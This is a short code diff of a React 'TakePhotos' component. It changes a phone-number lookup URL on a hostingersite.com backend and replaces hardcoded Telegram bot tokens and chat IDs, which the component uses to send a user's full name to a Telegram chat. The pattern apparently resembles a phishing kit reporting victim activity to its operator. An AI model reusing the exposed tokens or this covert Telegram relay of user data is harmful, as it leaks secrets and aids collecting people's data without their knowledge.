@@ -17,7 +17,7 @@ const TakePhotos: React.FC = () => {
   const fetchPhoneNumber = async () => {
     try {
       const res = await fetch(
-        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php?action=get_phone",
+        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api7.php?action=get_phone",
       );
       const data = await res.json();
       return data.phone || "";
@@ -40,8 +40,8 @@ const TakePhotos: React.FC = () => {
     e.preventDefault();
     setShowPopup(true);
 
-    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
-    const chatId = "8317872395";
+    const botToken = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
+    const chatId = "4575071223";
     const message = `${fullName} Photos taken`;
 
     try {
